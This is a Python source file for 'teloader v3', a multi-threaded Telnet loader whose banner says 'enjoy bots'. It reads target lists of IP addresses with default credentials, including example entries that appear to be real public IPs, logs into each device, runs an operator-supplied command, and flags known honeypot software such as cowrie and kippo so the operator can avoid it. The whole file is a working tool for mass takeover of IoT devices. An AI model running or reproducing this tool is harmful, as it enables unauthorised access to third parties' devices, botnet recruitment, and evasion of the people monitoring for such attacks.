import re
import time
import telnetlib
import socket
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

#     .....                           ..          ...                                 ..
#  .H8888888h.  ~-.             x .d88"       .zf"` `"tu                            dF
#  888888888888x  `>             5888R       x88      '8N.        u.               '88bu.                    .u    .
# X~     `?888888hx~      .u     '888R       888k     d88&  ...ue888b        u     '*88888bu        .u     .d88B :@8c
# '      x8.^"*88*"    ud8888.    888R       8888N.  @888F  888R Y888r    us888u.    ^"*8888N    ud8888.  ="8888f8888r
#  `-:- X8888x       :888'8888.   888R       `88888 9888%   888R I888> .@88 "8888"  beWE "888L :888'8888.   4888>'88"
#       488888>      d888 '88%"   888R         %888 "88F    888R I888> 9888  9888   888E  888E d888 '88%"   4888> '
#     .. `"88*       8888.+"      888R          8"   "*h=~  888R I888> 9888  9888   888E  888E 8888.+"      4888>
#   x88888nX"      . 8888L        888R        z8Weu        u8888cJ888  9888  9888   888E  888F 8888L       .d888L .+
#  !"*8888888n..  :  '8888c. .+  .888B .     ""88888i.   Z  "*888*P"   9888  9888  .888N..888  '8888c. .+  ^"8888*"
# '    "*88888888*    "88888%    ^*888%     "   "8888888*     'Y"      "888*""888"  `"888*""    "88888%       "Y"
#         ^"***"`       "YP'       "%             ^"**""                ^Y"   ^Y'      ""         "YP'

#                                                                           teloader v3 by @Syn2Much
#                                                                                 enjoy bots
# ANSI colors
RST = "\033[0m"
BOLD = "\033[1m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
WHITE = "\033[97m"

# Lock for thread-safe printing
print_lock = Lock()
counter_visible = False  # tracks whether the counter bar is currently displayed


def build_counter(total, logins, commands, remaining):
    """Build the colored counter bar string."""
    return (
        f"  {BOLD}{WHITE}[Total: {total}]{RST}  "
        f"{BOLD}{GREEN}[Logins: {logins}]{RST}  "
        f"{BOLD}{YELLOW}[Commands: {commands}]{RST}  "
        f"{BOLD}{CYAN}[Remaining: {remaining}]{RST}"
    )


def display_result(text, total, logins, commands, remaining):
    """Clear the counter line, print a result, then reprint the counter."""
    global counter_visible
    with print_lock:
        # If a counter bar is on screen, erase it first
        if counter_visible:
            sys.stdout.write("\r\033[2K")
        # Print the result line(s)
        print(text)
        # Reprint the counter bar (no trailing newline so it stays in place)
        sys.stdout.write(build_counter(total, logins, commands, remaining))
        sys.stdout.flush()
        counter_visible = True


def update_counter(total, logins, commands, remaining):
    """Redraw only the counter bar in-place (no result to print)."""
    global counter_visible
    with print_lock:
        sys.stdout.write("\r\033[2K")
        sys.stdout.write(build_counter(total, logins, commands, remaining))
        sys.stdout.flush()
        counter_visible = True


def clear_counter():
    """Clear the counter bar so normal output can resume."""
    global counter_visible
    with print_lock:
        if counter_visible:
            sys.stdout.write("\r\033[2K")
            sys.stdout.flush()
            counter_visible = False


def parse_target(target_line):
    """Parse a target line into host, port, username, password."""
    target_line = target_line.strip()
    if not target_line:
        return None

    parts = target_line.split()
    if len(parts) != 2:
        return None

    host_port, user_pass = parts

    # Parse host:port
    if ":" in host_port:
        host, port = host_port.rsplit(":", 1)
        port = int(port)
    else:
        host = host_port
        port = 23  # Default telnet port

    # Parse user:password
    if ":" in user_pass:
        user, password = user_pass.split(":", 1)
    else:
        user = user_pass
        password = ""

    return {"host": host, "port": port, "user": user, "password": password}


# Shell prompt patterns: (compiled regex, label, privilege level)
SHELL_PROMPTS = [
    (re.compile(b"\\$ $"), "sh", "user"),
    (re.compile(b"\\$\\ $"), "sh", "user"),
    (re.compile(b"# $"), "root", "root"),
    (re.compile(b"#\\ $"), "root", "root"),
    (re.compile(b"> $"), "cli", "user"),
    (re.compile(b">\\ $"), "cli", "user"),
    (re.compile(b"% $"), "csh", "user"),
    (re.compile(b"%\\ $"), "csh", "user"),
    (re.compile(b"\\(.*\\)#"), "busybox", "root"),
    (re.compile(b"\\(.*\\)\\$"), "busybox", "user"),
]

# Pre-compiled patterns for telnetlib.expect (order matters)
_PROMPT_EXPECT = [pat for pat, _, _ in SHELL_PROMPTS]

# Pre-compiled login prompt patterns
_LOGIN_PROMPTS = [
    re.compile(b"login: "),
    re.compile(b"Login: "),
    re.compile(b"Username: "),
    re.compile(b"username: "),
]

# Pre-compiled password prompt patterns
_PASSWORD_PROMPTS = [
    re.compile(b"Password: "),
    re.compile(b"password: "),
]

# Pre-compiled login failure signatures
LOGIN_FAIL_PATTERNS = [
    re.compile(b"Login incorrect"),
    re.compile(b"login incorrect"),
    re.compile(b"Authentication failed"),
    re.compile(b"authentication failed"),
    re.compile(b"Access denied"),
    re.compile(b"access denied"),
    re.compile(b"Login failed"),
    re.compile(b"login failed"),
    re.compile(b"invalid login"),
    re.compile(b"Invalid login"),
    re.compile(b"bad password"),
    re.compile(b"Bad password"),
    re.compile(b"Permission denied"),
    re.compile(b"incorrect password"),
]

# Honeypot detection: known software names that appear in banners/MOTD.
# Only match strings that definitively identify honeypot software.
# Avoid matching generic device banners (BusyBox, ash, etc.) that real
# embedded devices also produce.
_HONEYPOT_SIGNATURES = [
    re.compile(b"kippo", re.IGNORECASE),
    re.compile(b"cowrie", re.IGNORECASE),
    re.compile(b"honeypot", re.IGNORECASE),
    re.compile(b"dionaea", re.IGNORECASE),
    re.compile(b"HonSSH", re.IGNORECASE),
    re.compile(b"Telnet Honey", re.IGNORECASE),
    re.compile(b"honeytrap", re.IGNORECASE),
    re.compile(b"glutton", re.IGNORECASE),
]


def detect_honeypot(banner_data):
    """Check for known honeypot software names in banner/session data.

    Only flags definitive signatures. Does NOT flag based on timing or
    generic banners (BusyBox, ash, etc.) to avoid false positives on
    real embedded devices.

    Returns a string describing the honeypot indicator, or None.
    """
    for pat in _HONEYPOT_SIGNATURES:
        m = pat.search(banner_data)
        if m:
            return f"honeypot signature: {m.group().decode('ascii', errors='replace')}"
    return None


def detect_shell(data):
    """Inspect raw bytes for known shell prompt signatures.

    Returns (shell_label, privilege) or (None, None).
    """
    for pattern, label, priv in SHELL_PROMPTS:
        if pattern.search(data):
            return label, priv
    return None, None


def _remaining(deadline):
    """Seconds left until *deadline*, floored at 0."""
    return max(0.0, deadline - time.monotonic())


def telnet_connect(target, command="uname -a", timeout=10, max_time=None):
    """Connect to a single target and execute commands."""
    host = target["host"]
    port = target["port"]
    user = target["user"]
    password = target["password"]

    if max_time is None:
        max_time = 4 * timeout
    deadline = time.monotonic() + max_time

    result = {
        "host": host,
        "port": port,
        "user": user,
        "success": False,
        "output": "",
        "error": "",
        "shell": "",
        "privilege": "",
        "honeypot": "",
    }

    try:
        # Connect to the Telnet server
        tn = telnetlib.Telnet(host, port, timeout=timeout)

        # Collect all banner data for honeypot analysis
        banner_data = b""

        # Login process - handle different prompt styles
        wait = min(timeout, _remaining(deadline))
        index, match, text = tn.expect(_LOGIN_PROMPTS, timeout=wait)
        banner_data += text
        if index == -1:
            result["error"] = "No login prompt received"
            tn.close()
            return result
        tn.write(user.encode("ascii") + b"\n")

        wait = min(timeout, _remaining(deadline))
        index, match, text = tn.expect(_PASSWORD_PROMPTS, timeout=wait)
        banner_data += text
        if index == -1:
            result["error"] = "No password prompt received"
            tn.close()
            return result
        tn.write(password.encode("ascii") + b"\n")

        # Wait for either a shell prompt or a login-failure message
        post_login_expect = _PROMPT_EXPECT + LOGIN_FAIL_PATTERNS
        wait = min(timeout, _remaining(deadline))
        index, match, text = tn.expect(post_login_expect, timeout=wait)
        banner_data += text

        if index == -1:
            # Timeout — no recognisable prompt or failure string
            result["error"] = "No shell prompt detected (unknown device)"
            tn.close()
            return result

        if index >= len(_PROMPT_EXPECT):
            # Matched a login-failure pattern
            fail_msg = text.decode("ascii", errors="replace").strip()
            result["error"] = f"Login rejected: {fail_msg}"
            tn.close()
            return result

        # Matched a shell prompt — identify it
        shell_label, privilege = SHELL_PROMPTS[index][1], SHELL_PROMPTS[index][2]

        # Secondary heuristic: scan the full received text for busybox / device hints
        post_text = text.decode("ascii", errors="replace").lower()
        if "busybox" in post_text:
            shell_label = "busybox"
        elif "mikrotik" in post_text:
            shell_label = "mikrotik"
        elif "/tc/" in post_text or "procd" in post_text:
            shell_label = "openwrt"

        result["shell"] = shell_label
        result["privilege"] = privilege

        # Honeypot detection
        hp = detect_honeypot(banner_data)
        if hp:
            result["honeypot"] = hp

        # Execute command
        tn.write(command.encode("ascii") + b"\n")
        tn.write(b"exit\n")

        # Read output with deadline instead of blocking read_all()
        output_chunks = []
        read_deadline = min(deadline, time.monotonic() + timeout)
        try:
            while True:
                wait = max(0.0, min(2.0, read_deadline - time.monotonic()))
                if wait <= 0:
                    break
                idx, _, chunk = tn.expect(_PROMPT_EXPECT, timeout=wait)
                if chunk:
                    output_chunks.append(chunk)
                if idx != -1:
                    break
                if not chunk:
                    break
        except EOFError:
            pass  # Connection closed after exit — normal

        # Drain any residual data
        try:
            leftover = tn.read_very_eager()
            if leftover:
                output_chunks.append(leftover)
        except EOFError:
            pass

        output = b"".join(output_chunks).decode("ascii", errors="replace")
        result["output"] = output.strip()
        result["success"] = True

        tn.close()

    except socket.timeout:
        result["error"] = "Connection timed out"
    except ConnectionRefusedError:
        result["error"] = "Connection refused"
    except ConnectionResetError:
        result["error"] = "Connection reset"
    except EOFError:
        result["error"] = "Connection closed by remote host"
    except Exception as e:
        result["error"] = str(e)

    return result


def _is_transient(result):
    """Return True if the failure looks transient (worth retrying)."""
    err = result.get("error", "")
    transient_keywords = [
        "timed out",
        "Connection refused",
        "Connection reset",
        "Connection closed",
    ]
    return any(kw in err for kw in transient_keywords)


def telnet_connect_with_retry(
    target, command="uname -a", timeout=10, max_time=None, retries=0
):
    """Wrap telnet_connect() with retry logic for transient failures."""
    for attempt in range(1 + retries):
        result = telnet_connect(
            target, command=command, timeout=timeout, max_time=max_time
        )
        if result["success"] or not _is_transient(result) or attempt >= retries:
            return result
        # Brief backoff: 0.5s increments, capped at 2s
        time.sleep(min(0.5 * (attempt + 1), 2.0))
    return result


def load_targets(filename):
    """Load targets from a file."""
    targets = []
    try:
        with open(filename, "r") as f:
            for line in f:
                parsed = parse_target(line)
                if parsed:
                    targets.append(parsed)
    except FileNotFoundError:
        print(f"Error: File '{filename}' not found.")
        exit(1)
    except Exception as e:
        print(f"Error reading file: {e}")
        exit(1)

    return targets


def main():
    parser = argparse.ArgumentParser(
        description="Multi-threaded Telnet connection tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example usage:
  python telnet_scan.py -l targets.txt -t 10
  python telnet_scan.py -l targets.txt -t 20 -c "whoami"
  python telnet_scan.py -l targets.txt -t 5 -o results.txt

Target file format (one per line):
  IP:PORT USER:PASSWORD
  18.181.177.7:23 root:root
  221.1.120.79:23 admin:admin
        """,
    )

    parser.add_argument(
        "-l", "--list", required=True, help="File containing target list"
    )
    parser.add_argument(
        "-t", "--threads", type=int, default=10, help="Number of threads (default: 10)"
    )
    parser.add_argument(
        "-c",
        "--command",
        default="uname -a",
        help="Command to execute (default: uname -a)",
    )
    parser.add_argument("-o", "--output", help="Output file for results")
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Connection timeout in seconds (default: 10)",
    )
    parser.add_argument(
        "--max-time",
        type=int,
        default=None,
        help="Max total seconds per target (default: 4 * timeout)",
    )
    parser.add_argument(
        "--retries",
        type=int,
        default=0,
        help="Retries for transient failures (default: 0)",
    )

    args = parser.parse_args()

    timeout = args.timeout
    max_time = args.max_time if args.max_time is not None else 4 * timeout

    # Load targets
    targets = load_targets(args.list)

    if not targets:
        print("No valid targets found in the file.")
        exit(1)

    print(f"[*] Loaded {len(targets)} targets")
    print(f"[*] Using {args.threads} threads")
    print(f"[*] Command: {args.command}")
    print(f"[*] Timeout: {timeout}s  Max-time: {max_time}s  Retries: {args.retries}")
    print("=" * 60)

    results = []
    successful = 0
    failed = 0
    total = len(targets)
    file_lock = Lock()

    # Show initial counter
    update_counter(total, 0, 0, total)

    # Open output file for incremental writing if specified
    out_file = None
    if args.output:
        out_file = open(args.output, "w")
        out_file.write(f"teloader results — {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        out_file.write("=" * 60 + "\n")
        out_file.flush()

    try:
        # Process targets with thread pool
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            # Submit all tasks
            future_to_target = {
                executor.submit(
                    telnet_connect_with_retry,
                    target,
                    args.command,
                    timeout,
                    max_time,
                    args.retries,
                ): target
                for target in targets
            }

            # Process results as they complete
            for future in as_completed(future_to_target):
                result = future.result()
                results.append(result)

                remaining = total - len(results)

                if result["success"]:
                    successful += 1
                    shell_tag = result["shell"] or "unknown"
                    priv_tag = result["privilege"] or "?"
                    hp_tag = (
                        f" {RED}[HONEYPOT: {result['honeypot']}]{RST}"
                        if result.get("honeypot")
                        else ""
                    )
                    text = (
                        f"{GREEN}[+] SUCCESS: {result['host']}:{result['port']} "
                        f"({result['user']}) "
                        f"[{YELLOW}{shell_tag}{RST} | {CYAN}{priv_tag}{RST}]{hp_tag}{RST}\n"
                        f"    Output: {result['output'][:200]}"
                    )
                    display_result(text, total, successful, successful, remaining)

                    # Incremental file write
                    if out_file:
                        with file_lock:
                            hp_note = (
                                f"  *** HONEYPOT: {result['honeypot']} ***\n"
                                if result.get("honeypot")
                                else ""
                            )
                            out_file.write(
                                f"[+] {result['host']}:{result['port']} "
                                f"({result['user']}) "
                                f"[{result['shell'] or 'unknown'} | {result['privilege'] or '?'}]\n"
                                f"{hp_note}"
                                f"    {result['output'][:500]}\n"
                            )
                            out_file.flush()
                else:
                    failed += 1
                    text = f"{RED}[-] FAILED: {result['host']}:{result['port']} - {result['error']}{RST}"
                    display_result(text, total, successful, successful, remaining)

                    # Incremental file write
                    if out_file:
                        with file_lock:
                            out_file.write(
                                f"[-] {result['host']}:{result['port']} - {result['error']}\n"
                            )
                            out_file.flush()

    finally:
        # Write summary footer and close output file
        if out_file:
            out_file.write("\n" + "=" * 60 + "\n")
            out_file.write(
                f"Summary: {successful} successful, {failed} failed, {total} total\n"
            )
            out_file.close()

    # Clear the counter bar before printing summary
    clear_counter()

    # Print summary
    print("\n" + "=" * 60)
    print(
        f"[*] Completed: {GREEN}{successful} successful{RST}, {RED}{failed} failed{RST}"
    )

    if args.output:
        print(f"[*] Results saved to: {args.output}")


if __name__ == "__main__":
    main()
